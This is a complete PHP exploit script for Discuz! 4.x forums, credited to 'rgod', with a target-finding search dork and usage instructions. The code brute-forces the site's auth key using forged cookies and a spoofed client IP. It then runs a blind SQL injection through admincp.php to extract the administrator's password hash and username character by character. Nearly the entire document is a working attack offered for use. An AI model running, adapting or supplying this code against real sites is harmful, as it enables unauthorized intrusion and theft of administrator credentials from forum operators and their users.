<?php
print_r('
---------------------------------------------------------------------------
Discuz! 4.x SQL injection / admin credentials disclosure exploit
by rgod rgod@autistici.org
site: http://retrogod.altervista.org
dork: "powered by discuz!
---------------------------------------------------------------------------
');
if ($argc<3) {
 print_r('
---------------------------------------------------------------------------
Usage: php '.$argv[0].' host path OPTIONS
host: target server (ip/hostname)
path: path to discuz
Options:
 -p[port]: specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' localhost /discuz/ -P1.1.1.1:80
php '.$argv[0].' localhost /discuz/ -p81
---------------------------------------------------------------------------
');
 die;
}
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
 $result='';$exa='';$cont=0;
 for ($i=0; $i<=strlen($string)-1; $i++)
 {
 if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
 {$result.=" .";}
 else
 {$result.=" ".$string[$i];}
 if (strlen(dechex(ord($string[$i])))==2)
 {$exa.=" ".dechex(ord($string[$i]));}
 else
 {$exa.=" 0".dechex(ord($string[$i]));}
 $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
 }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function sendpacketii($packet)
{
 global $proxy, $host, $port, $html, $proxy_regex;
 if ($proxy=='') {
 $ock=fsockopen(gethostbyname($host),$port);
 if (!$ock) {
 echo 'No response from '.$host.':'.$port; die;
 }
 }
 else {
 $c = preg_match($proxy_regex,$proxy);
 if (!$c) {
 echo 'Not a valid proxy...';die;
 }
 $parts=explode(':',$proxy);
 echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
 $ock=fsockopen($parts[0],$parts[1]);
 if (!$ock) {
 echo 'No response from proxy...';die;
 }
 }
 fputs($ock,$packet);
 if ($proxy=='') {
 $html='';
 while (!feof($ock)) {
 $html.=fgets($ock);
 }
 }
 else {
 $html='';
 while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
 $html.=fread($ock,1);
 }
 }
 fclose($ock);
}

$host=$argv[1];
$path=$argv[2];
$port=80;
$proxy="";
for ($i=3; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp=="-p")
{
 $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
 $proxy=str_replace("-P","",$argv[$i]);
}
}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

echo "please wait...\n";

//from global.func.php
function authcode($string, $operation, $key = '') {
 $key = $key ? $key : $GLOBALS['discuz_auth_key'];
 $coded = '';
 $keylength = 32;
 $string = $operation == 'DECODE' ? base64_decode($string) : $string;
 for($i = 0; $i < strlen($string); $i += 32) {
 $coded .= substr($string, $i, 32) ^ $key;
 }
 $coded = $operation == 'ENCODE' ? str_replace('=', '', base64_encode($coded)) : $coded;
 return $coded;
}

//stolen from install.php
function random($length) {
 $hash = '';
 $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz';
 $max = strlen($chars) - 1;
 mt_srand((double)microtime() * 1000000);
 for($i = 0; $i < $length; $i++) {
 $hash .= $chars[mt_rand(0, $max)];
 }
 return $hash;
}

$agent="Googlebot/2.1";
//see sql errors... you need auth key,
//it's a value mixed up with the random string in cache_settigns.php and your user-agent, so let's ask ;)
$tt="";for ($i=0; $i<=255; $i++){$tt.=chr($i);}
while (1)
{
 $discuz_auth_key=random(32);
 $packet ="GET ".$p."admincp.php?action=recyclebin HTTP/1.0\r\n";
 $packet.="CLIENT-IP: 999.999.999.999\r\n";//spoof
 $packet.="User-Agent: $agent\r\n";
 $packet.="Host: ".$host."\r\n";
 $packet.="Cookie: adminid=1; cdb_sid=1; cdb_auth=".authcode("suntzu\tsuntzu\t".$tt,"ENCODE").";\r\n";
 $packet.="Accept: text/plain\r\n";
 $packet.="Connection: Close\r\n\r\n";
 $packet.=$data;
 sendpacketii($packet);
 $html=html_entity_decode($html);
 $html=str_replace("<br />","",$html);
 $t=explode("AND m.password='",$html);
 $t2=explode("' ",$t[1]);
 $pwd_f=$t2[0];
 $t=explode("AND m.secques='",$html);
 $t2=explode("'\n",$t[1]);
 $secques_f=$t2[0];
 $t=explode("AND m.uid='",$html);
 $t2=explode("'\x0d",$t[1]);
 $uid_f=$t2[0];
 $my_string=$pwd_f."\t".$secques_f."\t".$uid_f;
 if ((strlen($my_string)==270) and (!eregi("=",$my_string))){
 break;
 }
}
$temp = authcode("suntzu\tsuntzu\t".$tt,"ENCODE");
//calculating key...
$key="";
for ($j=0; $j<32; $j++){
 for ($i=0; $i<255; $i++){
 $aa="";
 if ($j<>0){
 for ($k=1; $k<=$j; $k++){
 $aa.="a";
 }
 }
 $GLOBALS['discuz_auth_key']=$aa.chr($i);
 $t = authcode($temp,"DECODE");
 if ($t[$j]==$my_string[$j]){
 $key.=chr($i);
 }
 }
}

//echo "AUTH KEY ->".$key."\r\n";
$GLOBALS['discuz_auth_key']=$key;

echo "pwd hash (md5) -> ";
$chars[0]=0;//null
$chars=array_merge($chars,range(48,57)); //numbers
$chars=array_merge($chars,range(97,102));//a-f letters
$j=1;$password="";
while (!strstr($password,chr(0)))
{
 for ($i=0; $i<=255; $i++)
 {
 if (in_array($i,$chars))
 {
 //you can use every char because of base64_decode()...so this bypass magic quotes...
 //and some help by extract() to overwrite vars
 $sql="999999'/**/UNION/**/SELECT/**/1,1,1,1,1,1,1,1,1,1,1,1,(IF((ASCII(SUBSTRING(m.password,$j,1))=".$i."),1,0)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/FROM/**/cdb_sessions/**/s,/**/cdb_members/**/m/**/WHERE/**/adminid=1/**/LIMIT/**/1/*";
 $packet ="GET ".$p."admincp.php?action=recyclebin& HTTP/1.0\r\n";
 $packet.="User-Agent: $agent\r\n";
 $packet.="CLIENT-IP: 1.2.3.4\r\n";
 $packet.="Host: ".$host."\r\n";
 $packet.="Cookie: adminid=1; cdb_sid=1; cdb_auth=".authcode("suntzu\tsuntzu\t".$sql,"ENCODE").";\r\n";
 $packet.="Accept: text/plain\r\n";
 $packet.="Connection: Close\r\n\r\n";
 $packet.=$data;
 sendpacketii($packet);
 if (eregi("action=groupexpiry",$html)){
 $password.=chr($i);echo chr($i);sleep(1);break;
 }
 }
 if ($i==255) {
 die("\nExploit failed...");
 }
 }
$j++;
}

echo "\nadmin user -> ";
$j=1;$admin="";
while (!strstr($admin,chr(0)))
{
 for ($i=0; $i<=255; $i++)
 {
 $sql="999999'/**/UNION/**/SELECT/**/1,1,1,1,1,1,1,1,1,1,1,1,(IF((ASCII(SUBSTRING(m.username,$j,1))=".$i."),1,0)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/FROM/**/cdb_sessions/**/s,/**/cdb_members/**/m/**/WHERE/**/adminid=1/**/LIMIT/**/1/*";
 $packet ="GET ".$p."admincp.php?action=recyclebin& HTTP/1.0\r\n";
 $packet.="User-Agent: $agent\r\n";
 $packet.="CLIENT-IP: 1.2.3.4\r\n";
 $packet.="Host: ".$host."\r\n";
 $packet.="Cookie: adminid=1; cdb_sid=1; cdb_auth=".authcode("suntzu\tsuntzu\t".$sql,"ENCODE").";\r\n";
 $packet.="Accept: text/plain\r\n";
 $packet.="Connection: Close\r\n\r\n";
 $packet.=$data;
 sendpacketii($packet);
 if (eregi("action=groupexpiry",$html)){
 $admin.=chr($i);echo chr($i);sleep(1);break;
 }
 if ($i==255) {die("\nExploit failed...");}
 }
$j++;
}

function is_hash($hash)
{
 if (ereg("^[a-f0-9]{32}",trim($hash))) {return true;}
 else {return false;}
}

if (is_hash($password)) {
 echo "exploit succeeded...";
}
else {
 echo "exploit failed...";
}
?>
